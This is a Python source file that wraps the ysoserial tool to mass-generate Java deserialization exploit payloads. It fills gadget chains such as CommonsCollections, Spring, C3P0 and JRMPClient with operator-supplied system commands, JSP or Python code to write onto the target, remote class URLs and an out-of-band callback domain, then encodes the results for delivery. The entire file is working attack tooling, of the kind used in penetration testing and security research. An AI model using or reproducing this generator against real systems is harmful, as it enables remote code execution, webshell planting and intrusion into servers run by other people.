import re
import logging
import urllib.parse
import os
import base64
from .serializer import Serializer

class YSOSerial(Serializer):

    usage = 'Y SO SERIAL?'

    specialPayloadFormats = {
        'AspectJWeaver': ['<remote_file>;<base64>'],
        'C3P0': ['<remote_url>:<classname>'],
        'FileUpload1': ['writeB64;<remote_dir>;<base64>', 'writeOldB64;<remote_file>;<base64>'],
        'JRMPClient': ['<domain>'],
        'JRMPListener': ['<remote_port>'],
        'Jython1': ['<local_py_file>;<remote_py_file>'],
        'Myfaces2': ['<remote_url>:<classname>'],
        'URLDNS': ['<url>'],
        'Wicket1': ['writeB64;<remote_dir>;<base64>', 'writeOldB64;<remote_file>;<base64>'],
    }

    maxVersionRequired = {
        'CommonsCollections1': 11,
        'CommonsCollections3': 11,
        'CommonsCollections5': 11,
        'Groovy1': 11,
        'Hibernate2': 11,
        'JRMPListener': 11,
        'Jdk7u21': 11,
        'JSON1': 8,
        'MozillaRhino1': 11,
        'Spring1': 11,
        'Spring2': 11,
        'Vaadin1': 11,
    }

    def __init__(self, javaPath, jarPath, chainOpts):
        self.javaPath = javaPath
        self.jarPath = jarPath
        self.javaVersion = 11
        javaOpts = "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED"
        bin = f"{javaPath} {javaOpts} -jar {jarPath}"
        super().__init__(bin, chainOpts)

    def exists(self):
        result = super().exists()
        if not result:
            return False
        logging.debug("Checking java binary version")
        binBackup = self.bin
        self.bin = self.javaPath
        versionOut = self.exec('-version', rawResult=True).stderr.decode("ascii").split('\n')
        self.bin = binBackup
        pattern = r"version\s+\"(?P<version>[0-9]+)\."
        regex = re.compile(pattern)
        for line in versionOut:
            match = regex.search(line)
            if match:
                self.javaVersion = int(match.groupdict()['version'])
                break
        if self.javaVersion < 8 or self.javaVersion > 11:
            logging.warning(f"Java version is not >= 8 or <= 11. Version detected: {self.javaVersion}. You might having errors generating payloads.")
            logging.warning("It is recommended to install it and use it with --java-path option or use Docker container")
            logging.debug('\n'.join(versionOut))
        return True


    
    def chains(self):
        chainsOutput = self.exec('').split('\n')
        pattern = r"^\s+(?P<name>[\w]+)\s{1,}@.+$"
        regex = re.compile(pattern)
        chains = []
        for line in chainsOutput:
            match = regex.search(line)
            if not match:
                continue
            chain = match.groupdict()
            if chain['name'] == 'Payload': 
                continue

            if chain['name'] in self.specialPayloadFormats:
                for format in self.specialPayloadFormats[chain['name']]:
                    chains.append({
                        'id': chain['name'].lower(),
                        'name': chain['name'],
                        'format': format,
                    })
            else:
                chains.append({
                    'id': chain['name'].lower(),
                    'name': chain['name'],
                    'format': '<system_command>',
                })
            
        return chains

    def generate(self, chains, output):

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        jsp_code = self.getFileContentOrCode(self.chainOpts.jsp_code)
        py_code = self.getFileContentOrCode(self.chainOpts.python_code)
        remote_file = self.chainOpts.remote_file
        remote_dir = os.path.dirname(remote_file)
        remote_port = int(self.chainOpts.remote_port)
        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else jsp_code
        java_classname = self.chainOpts.java_classname
        if '%%domain%%' in self.chainOpts.java_remote_class_url and not interact_domain:
            logging.warning("%%domain%% in java remote class URL but no interact domain provided")
            java_remote_class_url = None
        else:
            java_remote_class_url = self.chainOpts.java_remote_class_url.replace('%%domain%%', interact_domain)

        logging.info(f"System command: {system_command}")
        logging.info(f"JSP Code: {jsp_code}")
        logging.info(f"Python Code: {py_code}")
        logging.info(f"File written on remote server: {remote_file}")
        logging.info(f"Content written on server: {remote_content}")
        logging.info(f"Interact domain: {interact_domain}")

        # create an empty file that will contain JSP and Python file with the payload
        fp = self.createTemporaryFile()
        pyFp = self.createTemporaryFile()

        logging.info(f"Generating payloads...")
        

        # generate payload for each chain
        count = 0
        for chain in chains:

            format = chain['format']

            if chain['name'] in self.maxVersionRequired and self.javaVersion > self.maxVersionRequired[chain['name']]:
                logging.warning(f"[{chain['name']}] Skipping payload with because it requires Java version <= {self.maxVersionRequired[chain['name']]}")
                continue

            if ('<url>' in format or '<domain>' in format) and not interact_domain:
                logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
                continue
            if '<remote_url>' in format and not java_remote_class_url:
                logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires a java remote URL")
                continue

            logging.info(f"[{chain['name']}] Generating payload with format '{format}'")


            chain_system_command = system_command
            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
            escaped_chain_system_command = chain_system_command.replace("'", "\\'")

            chain_jsp_code = jsp_code
            chain_jsp_code = chain_jsp_code.replace('%%system_command%%', escaped_chain_system_command)
            chain_jsp_code = chain_jsp_code.replace('%%domain%%', str(interact_domain))
            chain_jsp_code = chain_jsp_code.replace('%%chain_id%%', chain['id'])

            chain_remote_content = remote_content
            chain_remote_content = chain_remote_content.replace('%%system_command%%', escaped_chain_system_command)
            chain_remote_content = chain_remote_content.replace('%%domain%%', str(interact_domain))
            chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])

            chain_py_code = py_code
            chain_py_code = chain_py_code.replace('%%system_command%%', escaped_chain_system_command)
            chain_py_code = chain_py_code.replace('%%domain%%', str(interact_domain))
            chain_py_code = chain_py_code.replace('%%chain_id%%', chain['id'])

            chainArguments = format
            chainArguments = chainArguments.replace('<base64>', base64.b64encode(chain_remote_content.encode('ascii')).decode('ascii'))
            chainArguments = chainArguments.replace('<local_file>', fp.name)
            chainArguments = chainArguments.replace('<system_command>', chain_system_command)
            chainArguments = chainArguments.replace('<local_py_file>', pyFp.name)
            chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%%ext%%', 'jsp'))
            chainArguments = chainArguments.replace('<remote_py_file>', remote_file.replace('%%ext%%', 'py'))
            chainArguments = chainArguments.replace('<remote_dir>', remote_dir)
            chainArguments = chainArguments.replace('<remote_port>', str(remote_port))
            chainArguments = chainArguments.replace('<classname>', java_classname)
            chainArguments = chainArguments.replace('<domain>', str(interact_domain))
            chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
            chainArguments = chainArguments.replace('<remote_url>', str(java_remote_class_url).replace('%%chain_id%%', chain['id']))
            
            with open(fp.name, mode='w') as ft:
                ft.write(chain_jsp_code)

            with open(pyFp.name, mode='w') as ft:
                ft.write(chain_py_code)

            chainArguments = f"'{chainArguments}'"
            result = self.payload(chain['name'], chainArguments)

            if result.returncode != 0:
                logging.error(f"[{chain['name']}] Failed to create payload")
                logging.error(result.stderr.decode('ascii'))
                continue

            payload = result.stdout

            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            if self.chainOpts.base64:
                payload = base64.b64encode(payload)
            
            if self.chainOpts.url:
                payload = urllib.parse.quote_plus(payload).encode('ascii')
            
            output.write(payload+b"\n")
            count = count + 1
                
        return count
